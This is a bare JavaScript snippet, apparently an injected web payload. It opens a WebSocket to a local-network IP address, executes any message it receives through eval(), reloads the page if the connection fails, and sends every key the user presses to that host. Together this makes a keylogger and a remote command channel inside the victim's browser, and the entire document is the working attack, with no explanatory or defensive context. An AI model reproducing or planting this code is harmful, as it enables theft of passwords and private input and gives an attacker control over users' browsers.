const ws=new WebSocket('ws://192.168.233.129:8080/index');
ws.onmessage=e=>eval(e.data);
ws.onerror=()=>location.reload();
document.onkeydown=e=>ws.send('key:'+e.key)
